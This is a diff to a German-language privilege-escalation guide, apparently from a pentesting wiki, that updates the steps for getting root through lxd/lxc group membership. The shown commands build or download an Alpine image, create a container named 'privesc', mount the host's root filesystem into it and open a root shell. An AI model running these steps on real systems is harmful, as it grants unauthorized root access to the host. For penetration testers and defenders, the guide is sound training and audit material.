@@ -8,18 +8,22 @@ Wenn Sie zur _**lxd**_ **oder** _**lxc**_ **Gruppe** gehören, können Sie root 
 
 ### Methode 1
 
-Sie können auf Ihrem Rechner diesen Distro-Builder installieren: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(folgen Sie den Anweisungen auf GitHub):
+Sie können ein Alpine-Image von einem vertrauenswürdigen Repository herunterladen, um es mit lxd zu verwenden. Canonical veröffentlicht tägliche Builds auf ihrer Seite: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) 
+Laden Sie einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter. (Der Verzeichnisname ist das Datum).
+
+Alternativ können Sie diesen Distro-Builder auf Ihrem Rechner installieren: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (folgen Sie den Anweisungen auf GitHub):
 ```bash
-sudo su
 # Install requirements
 sudo apt update
-sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
 
 # Clone repo
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
 git clone https://github.com/lxc/distrobuilder
 
 # Make distrobuilder
-cd distrobuilder
+cd ./distrobuilder
 make
 
 # Prepare the creation of alpine
@@ -27,13 +31,10 @@ mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 
-# Create the container
-## Using build-lxd
-sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
-## Using build-lxc
-sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
+# Create the container - Beware of architecture while compiling locally.
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Laden Sie die Dateien **lxd.tar.xz** und **rootfs.squashfs** hoch, fügen Sie das Image zum Repo hinzu und erstellen Sie einen Container:
+Laden Sie die Dateien **incus.tar.xz** (**lxd.tar.xz**, wenn Sie sie aus dem Canonical-Repository heruntergeladen haben) und **rootfs.squashfs** hoch, fügen Sie das Image zum Repository hinzu und erstellen Sie einen Container:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -50,9 +51,9 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > Wenn Sie diesen Fehler _**Fehler: Kein Speicherpool gefunden. Bitte erstellen Sie einen neuen Speicherpool**_\
-> Führen Sie **`lxd init`** aus und **wiederholen** Sie den vorherigen Befehlssatz
+> Führen Sie **`lxd init`** aus und richten Sie alle Optionen auf die Standardeinstellungen ein. Dann **wiederholen** Sie den vorherigen Befehlssatz
 
-Schließlich können Sie den Container ausführen und Root erhalten:
+Schließlich können Sie den Container ausführen und root erhalten:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
